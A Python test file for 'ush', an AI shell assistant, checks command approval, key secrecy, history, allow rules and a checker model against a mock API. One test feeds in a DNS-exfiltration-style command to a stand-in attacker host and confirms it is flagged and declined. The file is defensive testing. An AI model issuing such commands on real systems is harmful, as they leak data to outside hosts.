"""End-to-end CLI runs without a terminal, against the mock API."""

import functools
import io
import json
import os
import subprocess
import sys
import unittest
from unittest import mock

from helpers import SYNTHETIC_KEY, TempDirTest
from mock_api import MockAPI
from ush import cli

SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src")
DEAD_URL = "http://127.0.0.1:9"  # the discard port: nothing listens, a request fails at once

try:
    import anthropic  # noqa: F401
    HAVE_SDK = True
except ImportError:
    HAVE_SDK = False


class CliTest(TempDirTest):
    def ush(self, *args, stdin="", env=None):
        base = {k: v for k, v in os.environ.items()
                if not k.startswith(("ANTHROPIC_", "USH_", "XDG_"))}
        base.update({"PYTHONPATH": SRC, "XDG_CONFIG_HOME": os.path.join(self.tmp, "config"),
                     "XDG_STATE_HOME": os.path.join(self.tmp, "state"), "NO_COLOR": "1",
                     # The developer's keychain is not isolated: a key found there must not reach
                     # a real provider. Tests that talk to a provider point these at a mock.
                     "USH_BASE_URL": DEAD_URL, "USH_OLLAMA_URL": DEAD_URL})
        base.update(env or {})
        # A new session has no controlling terminal, as in CI or a cron job.
        return subprocess.run([sys.executable, "-m", "ush", *args], input=stdin, text=True,
                              capture_output=True, env=base, cwd=self.tmp, timeout=60,
                              start_new_session=True)

    def test_help_and_usage_errors(self):
        self.assertIn("usage:", self.ush("help").stdout)
        # Both implementations are the command `ush`; --version says which one this is.
        self.assertRegex(self.ush("--version").stdout, r"^ush \d+\.\d+\.\d+\S* \(python\)\n$")
        result = self.ush("frobnicate")
        self.assertEqual(result.returncode, 2)
        self.assertIn("requests start with //", result.stderr)
        self.assertEqual(self.ush("-e", "ultra", "//x").returncode, 2)
        self.assertEqual(self.ush().returncode, 2)  # no terminal for a session

    def test_missing_key_fails_before_anything_runs(self):
        # In-process, with the keychain out of reach: a key the developer stored there must not
        # stand in for the missing one (it once did, and the request went to Anthropic).
        env = {k: v for k, v in os.environ.items()
               if not k.startswith(("ANTHROPIC_", "USH_", "XDG_"))}
        env.update({"XDG_CONFIG_HOME": os.path.join(self.tmp, "config"),
                    "XDG_STATE_HOME": os.path.join(self.tmp, "state"), "NO_COLOR": "1",
                    "USH_BASE_URL": DEAD_URL})
        err = io.StringIO()
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch("ush.config.SECURITY", os.path.join(self.tmp, "no-security")), \
                mock.patch("sys.stdin", io.TextIOWrapper(io.BytesIO())), \
                mock.patch.object(cli, "Terminal", functools.partial(cli.Terminal, err=err)):
            code = cli.main(["//why is my disk full"])
        self.assertEqual(code, 2)
        self.assertIn("no API key", err.getvalue())
        self.assertEqual(self.ush("history").stdout, "")

    def test_configure_asks_again_after_a_bad_answer(self):
        # A bad answer used to end `ai configure` with an error, losing what was entered; now the
        # same question is asked again. Ollama on an unused port: no key prompt, no models listed.
        answers = ["openai", "ollama", "http://127.0.0.1:9", "bad name!", "llama3.2:3b",
                   "anthropic:", "claude-haiku-5-5"]
        result = self.ush("ai", "configure", stdin="\n".join(answers) + "\n")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("provider must be one of", result.stderr)
        self.assertIn("checker 'anthropic:' is not a model name", result.stderr)
        self.assertIn("checker: claude-haiku-5-5 through anthropic", result.stderr)
        with open(os.path.join(self.tmp, "config", "ush", "config.json"), encoding="utf-8") as f:
            saved = json.load(f)
        self.assertEqual((saved["provider"], saved["ollama_url"], saved["ollama_model"],
                          saved["checker"]),
                         ("ollama", "http://127.0.0.1:9", "llama3.2:3b",
                          "anthropic:claude-haiku-5-5"))

    def test_ai_status_never_prints_the_key(self):
        result = self.ush("ai", "status", env={"ANTHROPIC_API_KEY": SYNTHETIC_KEY})
        self.assertIn("environment (ANTHROPIC_API_KEY)", result.stdout)
        self.assertNotIn(SYNTHETIC_KEY, result.stdout + result.stderr)

    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
    def test_request_with_piped_input_history_and_replay(self):
        victim = os.path.join(self.tmp, "victim")
        replies = [
            ([{"type": "tool_use", "id": "t1", "name": "run_command",
               "input": {"command": "echo checked-$((1+1))-ok | cat", "purpose": "probe",
                         "effect": "read", "timeout_seconds": 20}},
              {"type": "tool_use", "id": "t2", "name": "run_command",
               "input": {"command": "echo fine", "purpose": "probe", "effect": "read",
                         "timeout_seconds": 20}},
              {"type": "tool_use", "id": "t3", "name": "run_command",
               "input": {"command": f"touch {victim}", "purpose": "fix", "effect": "change",
                         "timeout_seconds": 20}}], "tool_use"),
            ([{"type": "text", "text": "The log shows a disk error."}], "end_turn"),
        ]
        env = {"ANTHROPIC_API_KEY": SYNTHETIC_KEY}
        with MockAPI(replies) as api:
            env["USH_BASE_URL"] = api.url
            result = self.ush("//what does this log mean?", stdin="kernel: disk0 I/O error\n",
                              env=env)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("The log shows a disk error.", result.stdout)
        self.assertFalse(os.path.exists(victim))
        first = json.dumps(api.requests[0]["body"]["messages"])
        self.assertIn("disk0 I/O error", first)
        results = api.requests[1]["body"]["messages"][2]["content"]
        self.assertIn("approval", results[0]["content"])  # $((...)) is not auto-approved
        self.assertIn("fine", results[1]["content"])
        self.assertIn("approval", results[2]["content"])

        listing = self.ush("history").stdout
        self.assertIn("// what does this log mean?", listing)
        self.assertIn("auto      $ echo fine", listing)
        self.assertIn("declined  $ touch", listing)

        replay = self.ush("replay", "last")
        self.assertEqual(replay.returncode, 0, replay.stderr)
        self.assertIn("fine", replay.stderr)
        self.assertFalse(os.path.exists(victim))
        with open(os.path.join(self.tmp, "state", "ush", "history.jsonl")) as f:
            self.assertNotIn(SYNTHETIC_KEY, f.read())


    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
    def test_local_ollama_needs_no_key_and_says_data_stays_here(self):
        replies = [([{"type": "text", "text": "Plenty of space."}], "end_turn")]
        with MockAPI(replies, tags=[{"name": "qwen3:8b"}]) as api:
            env = {"USH_PROVIDER": "ollama", "USH_MODEL": "qwen3:8b", "USH_OLLAMA_URL": api.url}
            result = self.ush("//is my disk full?", env=env)
            status = self.ush("ai", "status", env=env)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("Plenty of space.", result.stdout)
        self.assertIn("stay on this machine", result.stderr)
        self.assertNotIn("Anthropic", result.stderr)
        self.assertEqual(api.requests[0]["body"]["model"], "qwen3:8b")
        self.assertIn("key:       not needed", status.stdout)
        self.assertIn("ush · qwen3:8b", self.ush("history").stdout + result.stderr)

    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
    def test_ollama_cloud_model_is_disclosed(self):
        replies = [([{"type": "text", "text": "ok"}], "end_turn")]
        tags = [{"name": "gemma4:31b-cloud", "remote_host": "https://ollama.com:443"}]
        with MockAPI(replies, tags=tags) as api:
            result = self.ush("//x", env={"USH_PROVIDER": "ollama", "USH_MODEL": "gemma4:31b-cloud",
                                          "USH_OLLAMA_URL": api.url})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("go to https://ollama.com:443 via Ollama", result.stderr)
        self.assertNotIn("stay on this machine", result.stderr)

    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
    def test_a_checker_flag_stops_a_read_only_command_without_a_terminal(self):
        replies = [
            ([{"type": "tool_use", "id": "t1", "name": "run_command",
               "input": {"command": "dig +short abc123.attacker.example", "purpose": "check DNS",
                         "effect": "read", "timeout_seconds": 20}}], "tool_use"),
            ([{"type": "text", "text": "FLAG: sends data to an unrelated host"}], "end_turn"),
            ([{"type": "text", "text": "Could not check."}], "end_turn"),
        ]
        tags = [{"name": "qwen3.5:9b"}, {"name": "qwen3.5:2b"}]
        with MockAPI(replies, tags=tags) as api:
            env = {"USH_PROVIDER": "ollama", "USH_MODEL": "qwen3.5:9b", "USH_OLLAMA_URL": api.url,
                   "USH_CHECKER": "ollama:qwen3.5:2b"}
            result = self.ush("//why is my disk full?", env=env)
            status = self.ush("ai", "status", env=env)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("checker qwen3.5:2b: your requests and the proposed commands stay on this "
                      "machine", result.stderr)
        self.assertIn("checker qwen3.5:2b: flagged: sends data to an unrelated host", result.stderr)
        main, check, final = (r["body"] for r in api.requests)
        self.assertEqual((check["model"], "tools" in check, "stream" in check),
                         ("qwen3.5:2b", False, False))
        self.assertIn("why is my disk full?", check["messages"][0]["content"])
        self.assertIn("dig +short abc123.attacker.example", check["messages"][0]["content"])
        self.assertIn("needs the user's approval", json.dumps(final["messages"][-1]))
        self.assertIn("checker:   checker qwen3.5:2b", status.stdout)
        history = self.ush("history").stdout
        self.assertIn("declined", history)

    def test_allow_rules_are_listed_added_and_removed(self):
        self.assertIn("no allow rules", self.ush("allow").stderr)
        added = self.ush("allow", "add", "kubectl", "get")
        self.assertEqual(added.returncode, 0, added.stderr)
        self.assertEqual(self.ush("allow").stdout, "kubectl get\n")
        self.assertIn("allow:     1 rule(s)", self.ush("ai", "status").stdout)
        refused = self.ush("allow", "add", "bash")
        self.assertEqual(refused.returncode, 2)
        self.assertIn("runs other commands", refused.stderr)
        self.assertEqual(self.ush("allow", "remove", "kubectl", "get").returncode, 0)
        self.assertEqual(self.ush("allow").stdout, "")
        self.assertEqual(self.ush("allow", "remove", "kubectl", "get").returncode, 2)
        # Rules come only from the settings file, never from the environment.
        self.assertEqual(self.ush("allow", env={"USH_ALLOW": "git"}).stdout, "")

    def test_ollama_misconfiguration_fails_before_any_request(self):
        with MockAPI([]) as api:
            no_model = self.ush("//x", env={"USH_PROVIDER": "ollama", "USH_OLLAMA_URL": api.url})
            remote = self.ush("//x", env={"USH_PROVIDER": "ollama", "USH_MODEL": "qwen3:8b",
                                          "USH_OLLAMA_URL": "http://203.0.113.7:11434"})
            unknown = self.ush("//x", env={"USH_PROVIDER": "openai"})
        self.assertEqual(api.requests, [])
        self.assertEqual((no_model.returncode, remote.returncode, unknown.returncode), (2, 2, 2))
        self.assertIn("no Ollama model", no_model.stderr)
        self.assertIn("not on this machine", remote.stderr)
        self.assertIn("provider must be one of", unknown.stderr)

    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
    def test_terminal_approval_and_follow_up(self):
        import pty
        import select
        import time
        made = os.path.join(self.tmp, "made")
        replies = [
            ([{"type": "tool_use", "id": "t1", "name": "run_command",
               "input": {"command": f"touch {made}", "purpose": "create it", "effect": "change",
                         "timeout_seconds": 20}}], "tool_use"),
            ([{"type": "text", "text": "Created the file."}], "end_turn"),
        ]
        with MockAPI(replies) as api:
            pid, fd = pty.fork()
            if pid == 0:
                env = {k: v for k, v in os.environ.items() if not k.startswith(("ANTHROPIC_", "USH_"))}
                env.update({"PYTHONPATH": SRC, "ANTHROPIC_API_KEY": SYNTHETIC_KEY,
                            "USH_BASE_URL": api.url, "NO_COLOR": "1",
                            "XDG_CONFIG_HOME": os.path.join(self.tmp, "config"),
                            "XDG_STATE_HOME": os.path.join(self.tmp, "state")})
                os.chdir(self.tmp)
                os.execve(sys.executable, [sys.executable, "-m", "ush", "//make a file"], env)
            output = ""

            def until(text, timeout=20):
                nonlocal output
                end = time.time() + timeout
                while time.time() < end and text not in output:
                    if select.select([fd], [], [], 0.1)[0]:
                        try:
                            output += os.read(fd, 4096).decode(errors="replace")
                        except OSError:
                            break
                self.assertIn(text, output)

            try:
                until("run it?")
                self.assertIn("needs approval: touch is not a known read-only command", output)
                os.write(fd, b"y\r")
                until("ush> ")
                self.assertIn("Created the file.", output)
                os.write(fd, b"\r")  # an empty line ends the follow-up
                _, status = os.waitpid(pid, 0)
            finally:
                os.close(fd)
        self.assertTrue(os.path.exists(made))
        self.assertEqual(os.waitstatus_to_exitcode(status), 0)


if __name__ == "__main__":
    unittest.main()
